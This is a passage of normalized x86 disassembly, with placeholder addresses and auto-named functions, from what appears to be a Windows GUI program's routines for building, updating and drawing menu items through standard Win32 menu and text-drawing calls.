or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_404510
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_44911c
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_4476b0
mov [ ebp - 0x25 ] eax
sub_44741b
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_4471a0
xor eax eax
pop ebp
retn
sub_447440
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44ad14
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_449cdc
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44a1d8
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_446bdc
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_4474b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4474fa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4194bc
mov eax [ ebp - 0x4 ]
call sub_446a64
mov edx eax
mov eax ebx
call sub_449150
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447501
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_447508
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_447580
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_41aa14
sub_447544
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41ad94
mov eax ebx
call sub_449104
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_449104
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403490
pop esi
pop ebx
retn
mov eax ebx
call sub_447580
sub_447580
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_4476b0
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_447580
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_4476b0
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_4476b0
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_447440
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax ebp
call sub_4476b0
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_447650
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_44911c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_44912c
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_44912c
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_44912c
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_446758
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_4476b0
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_447440
mov eax [ rw-data ]
call sub_446758
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_4476fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41acbc
push ebx
push sub_4474b0
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_447740
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_447924
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4496d8
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4040e8
test bh 0x4
je r-xdata
mov eax edi
call sub_44ad14
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40445c
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41e2a0
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404318
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_41dc78
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_41dc84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44792b
lea eax [ ebp - 0xc ]
call sub_404050
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41e904
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404310
push eax
mov eax [ ebp - 0xc ]
call sub_404510
push eax
mov eax [ ebp - 0x4 ]
call sub_41e904
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41d9b8
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404310
push eax
mov eax [ ebp - 0xc ]
call sub_404510
push eax
mov eax [ ebp - 0x4 ]
call sub_41e904
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41d9b8
mov eax 0xff00000d
call sub_41d4f8
mov esi eax
mov eax 0xff000010
call sub_41d4f8
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41d9b8
jmp r-xdata
sub_447990
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_448278
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e528
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41e184
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41d9b8
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_40445c
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41e184
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e528
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_444754
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e904
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41e17c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41e184
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ffc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_447dd7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4220e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41d9b8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_444754
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41e184
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e528
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41e17c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4230e8
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41e158
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e528
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e528
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e62c
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_444a44
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41e184
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_447740
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41dc84
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e904
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41e47c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41d9b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403294
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e904
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_447740
mov eax [ ebp + 0x8 ]
